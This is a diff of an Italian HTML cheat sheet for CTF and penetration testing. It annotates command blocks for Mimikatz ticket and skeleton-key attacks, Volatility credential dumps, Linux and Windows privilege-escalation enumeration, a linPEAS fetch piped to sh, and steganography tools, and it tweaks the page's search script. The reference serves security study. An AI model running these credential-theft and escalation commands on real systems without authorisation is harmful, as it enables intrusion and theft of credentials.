+<span class="comment"># PTT</span>
 kerberos::ptt ticket.kirbi
 
-# Skeleton Key
+<span class="comment"># Skeleton Key</span>
 misc::skeleton</pre>
+  </div>
+  <div class="when">Quando hai accesso admin su un host Windows di dominio. Mimikatz è signature-detected, serve offuscamento in ambienti reali.</div>
+  <div class="next">Dopo aver estratto credenziali, usale per lateral movement (Pass-the-Hash, Pass-the-Ticket) → R7.</div>
 
   <h3>Wireshark / tshark - Network</h3>
-  <pre># Filtri display utili
+  <div class="why">Analisi PCAP. In CTF se hai un PCAP, inizia da qui.</div>
+  <div class="how">
+    <pre><span class="comment"># Filtri display utili</span>
 ip.addr == 10.0.0.5
 tcp.port == 443
 http.request.method == "POST"
@@ -1250,160 +1612,157 @@ tls.handshake.type == 1
 kerberos.msg_type == 10
 smb2.cmd == 5
 
-# tshark estrattore
+<span class="comment"># tshark estrattore</span>
 tshark -r traffic.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri
 
-# Export oggetti HTTP
-# Wireshark: File -> Export Objects -> HTTP
+<span class="comment"># Export oggetti HTTP</span>
+<span class="comment"># Wireshark: File -&gt; Export Objects -&gt; HTTP</span>
 
-# Statistiche
+<span class="comment"># Statistiche</span>
 tshark -r traffic.pcap -q -z io,phs
 tshark -r traffic.pcap -q -z conv,tcp</pre>
+  </div>
+  <div class="when">Sempre quando hai un PCAP. Sempre come primo passo.</div>
+  <div class="next">Dopo l'overview, passa a DNS, HTTP, TLS in ordine. Estrai file con Export Objects.</div>
 
   <h3>Volatility 3 - Memory</h3>
-  <pre># Info dump
+  <div class="why">Framework di memory forensics. In CTF se hai un dump, inizia da windows.info.</div>
+  <div class="how">
+    <pre><span class="comment"># Info dump</span>
 vol -f memory.raw windows.info
 
-# Processi
+<span class="comment"># Processi</span>
 vol -f memory.raw windows.pslist
 vol -f memory.raw windows.psscan
 vol -f memory.raw windows.pstree
 vol -f memory.raw windows.cmdline
 
-# Rete
+<span class="comment"># Rete</span>
 vol -f memory.raw windows.netscan
 
-# Code injection
+<span class="comment"># Code injection</span>
 vol -f memory.raw windows.malfind
 
-# Credenziali
+<span class="comment"># Credenziali</span>
 vol -f memory.raw windows.hashdump
 vol -f memory.raw windows.lsadump
-vol -f memory.raw windows.cachedump
 
-# Registry
+<span class="comment"># Registry</span>
 vol -f memory.raw windows.registry.hivelist
 vol -f memory.raw windows.registry.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"
 
-# Rootkit
+<span class="comment"># Rootkit</span>
 vol -f memory.raw windows.callbacks
-vol -f memory.raw windows.ssdt
-vol -f memory.raw windows.driverscan</pre>
+vol -f memory.raw windows.ssdt</pre>
+  </div>
+  <div class="when">Sempre quando hai un dump di memoria. Sempre dopo windows.info.</div>
+  <div class="next">Segui il workflow: processi, rete, malfind, registry, rootkit. Se trovi processo sospetto, dumpalo con memmap.</div>
 
   <h3>Linux PrivEsc - Comandi rapidi</h3>
-  <pre># Identita
-id
-whoami
-uname -a
-cat /etc/os-release
+  <div class="why">Enum manuale prima di linPEAS. Insegna cosa cercare.</div>
+  <div class="how">
+    <pre><span class="comment"># Identità</span>
+id; whoami; uname -a; cat /etc/os-release
 
-# Sudo
+<span class="comment"># Sudo</span>
 sudo -l
 
-# SUID
-find / -perm -u=s -type f 2>/dev/null
+<span class="comment"># SUID</span>
+find / -perm -u=s -type f 2&gt;/dev/null
 
-# Capabilities
-getcap -r / 2>/dev/null
+<span class="comment"># Capabilities</span>
+getcap -r / 2&gt;/dev/null
 
-# Cron
-cat /etc/crontab
-ls -la /etc/cron.*
-crontab -l
+<span class="comment"># Cron</span>
+cat /etc/crontab; ls -la /etc/cron.*
 
-# File scrivibili
-find / -writable -type d 2>/dev/null | grep -v proc
-find / -perm -o+w -type f 2>/dev/null | grep -E "(passwd|shadow|sudoers|crontab)"
+<span class="comment"># File scrivibili</span>
+find / -writable -type d 2&gt;/dev/null | grep -v proc
+find / -perm -o+w -type f 2&gt;/dev/null | grep -E "(passwd|shadow|sudoers)"
 
-# Servizi locali
+<span class="comment"># Servizi locali</span>
 ss -tlnp
-netstat -tlnp
 
-# History
-cat ~/.bash_history
-cat /root/.bash_history 2>/dev/null
+<span class="comment"># History</span>
+cat ~/.bash_history /root/.bash_history 2&gt;/dev/null
 
-# Credenziali in file
-grep -rE "password|pwd|passwd" /etc /var/www 2>/dev/null | head -50
-
-# Kernel exploit
+<span class="comment"># Kernel exploit</span>
 searchsploit "linux kernel 5.4"
-./les.sh
 
-# linPEAS
+<span class="comment"># linPEAS</span>
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</pre>
+  </div>
+  <div class="when">Sempre dopo aver stabilizzato la shell Linux.</div>
+  <div class="next">Per ogni finding, consulta GTFOBins. Se nulla funziona, passa a kernel exploit (con cautela in produzione).</div>
 
   <h3>Windows PrivEsc - Comandi rapidi</h3>
-  <pre># Identita
-whoami
-whoami /priv
-whoami /groups
-whoami /all
+  <div class="why">Enum manuale Windows. Diverso da Linux.</div>
+  <div class="how">
+    <pre><span class="comment"># Identità</span>
+whoami; whoami /priv; whoami /groups; whoami /all
 
-# Sistema
+<span class="comment"># Sistema</span>
 systeminfo
 wmic qfe get HotFixID,InstalledOn
 
-# Servizi
+<span class="comment"># Servizi</span>
 sc query
 sc qc &lt;service&gt;
-Get-Service | Where-Object {$_.Status -eq "Running"}
 
-# Scheduled tasks
+<span class="comment"># Scheduled tasks</span>
 schtasks /query /fo LIST /v
-Get-ScheduledTask
 
-# Software installato
-Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion
-
-# Credenziali registry
+<span class="comment"># Credenziali registry</span>
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
-# Unattend files
-dir /s /b c:\unattend.xml
-type c:\Windows\Panther\Unattend\Unattend.xml
-
-# AlwaysInstallElevated
+<span class="comment"># AlwaysInstallElevated</span>
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
-# Stored credentials
+<span class="comment"># Stored credentials</span>
 cmdkey /list
 
-# winPEAS
+<span class="comment"># winPEAS</span>
 winpeasx64.exe
-winpeas.bat
 
-# PowerUp
+<span class="comment"># PowerUp</span>
 Set-ExecutionPolicy Bypass -Scope Process
 . .\PowerUp.ps1
 Invoke-AllChecks</pre>
+  </div>
+  <div class="when">Sempre dopo aver stabilizzato la shell Windows.</div>
+  <div class="next">Se whoami /priv mostra SeImpersonate → Potato. Se AlwaysInstallElevated → MSI. Se servizio non quotato → injection.</div>
 
   <h3>Steganografia - Comandi</h3>
-  <pre># Analisi base
+  <div class="why">Se trovi un'immagine sospetta in CTF.</div>
+  <div class="how">
+    <pre><span class="comment"># Analisi base</span>
 file immagine.png
 exiftool immagine.png
 binwalk immagine.png
 strings immagine.png | less
 
-# LSB (PNG/BMP)
+<span class="comment"># LSB (PNG/BMP)</span>
 zsteg immagine.png
 zsteg -a immagine.png
 
-# JPEG
+<span class="comment"># JPEG</span>
 steghide info immagine.jpg
 steghide extract -sf immagine.jpg -p "password"
 stegseek immagine.jpg rockyou.txt
 
-# Estrazione file appesi
+<span class="comment"># Estrazione file appesi</span>
 binwalk -e immagine.png
 foremost -t jpg -i disk.img -o recovered/
 
-# Audio
-# Audacity -> View -> Spectrogram
+<span class="comment"># Audio</span>
+<span class="comment"># Audacity -&gt; View -&gt; Spectrogram</span>
 
-# Aperi'Solve (web)
-# https://aperisolve.com</pre>
+<span class="comment"># Aperi'Solve (web)</span>
+<span class="comment"># https://aperisolve.com</span></pre>
+  </div>
+  <div class="when">Sempre quando hai un'immagine o un audio in CTF.</div>
+  <div class="next">Se zsteg non trova nulla, prova binwalk -e. Se audio, spettrogramma. Se testo, zero-width.</div>
 
   <a class="back-top" href="#">Torna all'indice</a>
 </section>
@@ -1415,9 +1774,8 @@ foremost -t jpg -i disk.img -o recovered/
   const sections = document.querySelectorAll('section');
   const noResults = document.getElementById('noResults');
 
-  // Salva il contenuto originale di ogni elemento testuale per ripristinarlo
   const originalHTML = new Map();
-  document.querySelectorAll('section h2, section h3, section h4, section p, section li, section td, section th, section pre, section code').forEach(el => {
+  document.querySelectorAll('section h2, section h3, section h4, section p, section li, section td, section th, section pre, section code, section .why, section .how, section .when, section .next').forEach(el => {
     originalHTML.set(el, el.innerHTML);
   });
 
@@ -1436,22 +1794,15 @@ foremost -t jpg -i disk.img -o recovered/
   function highlight(el, term) {
     const original = originalHTML.get(el);
     if (!original) return false;
-
-    // Non evidenziare dentro tag HTML (semplificato: usa regex su testo)
+    if (term.includes('<') || term.includes('>')) return false;
     const regex = new RegExp('(' + escapeRegex(term) + ')', 'gi');
     if (!regex.test(original)) return false;
-
-    // Evita di rompere tag HTML: evidenzia solo se il match non è dentro un tag
-    // Approccio semplice: sostituisci solo se il termine non contiene < o >
-    if (term.includes('<') || term.includes('>')) return false;
-
     el.innerHTML = original.replace(regex, '<mark>$1</mark>');
     return true;
   }
 
   function performSearch() {
     const query = searchInput.value.trim().toLowerCase();
-
     clearHighlights();
 
     if (!query) {
@@ -1471,7 +1822,6 @@ foremost -t jpg -i disk.img -o recovered/
         section.classList.remove('hidden');
         visibleCount++;
 
-        // Evidenzia nei singoli elementi
         section.querySelectorAll('h2, h3, h4, p, li, td, th, pre, code').forEach(el => {
           highlight(el, query);
         });
@@ -1489,14 +1839,12 @@ foremost -t jpg -i disk.img -o recovered/
     }
   }
 
-  // Debounce per performance su mobile
   let debounceTimer;
   searchInput.addEventListener('input', function() {
     clearTimeout(debounceTimer);
     debounceTimer = setTimeout(performSearch, 150);
   });
 
-  // Clear con ESC
   searchInput.addEventListener('keydown', function(e) {
     if (e.key === 'Escape') {
       searchInput.value = '';
